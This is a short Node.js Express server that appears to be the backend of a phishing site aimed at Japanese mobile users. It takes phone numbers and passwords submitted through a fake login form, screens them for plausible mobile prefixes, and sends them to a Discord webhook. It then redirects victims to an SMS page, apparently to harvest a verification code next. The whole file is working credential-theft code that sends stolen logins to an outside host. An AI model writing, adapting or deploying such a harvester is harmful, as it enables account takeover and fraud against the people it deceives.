const express = require("express");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static("."));

const webhook = process.env.DISCORD_WEBHOOK;

app.post("/send", async (req, res) => {
  const phone = req.body.name;
  const password = req.body.message;

    // 安全対策（空のときに落ちないようにする）
  const safePhone = typeof phone === 'string' ? phone : '';
  const safePassword = typeof password === 'string' ? password : '';
  const cleanPhone = safePhone.replace(/[- ]/g, '');

  if (!/^(090|080|070|060)/.test(cleanPhone) || !/[A-Z]/.test(safePassword)) {
    return res.redirect("/login.html?error=1");
  }

  try {
    await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
body: JSON.stringify({
  content: phone,
  content: password 
})
    });


    console.log("送信成功");

    // 次の画面へ
    res.redirect("/sms.html");

  } catch (error) {
    console.error("送信失敗:", error);
    res.status(500).send("エラー");
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("Server started");
});
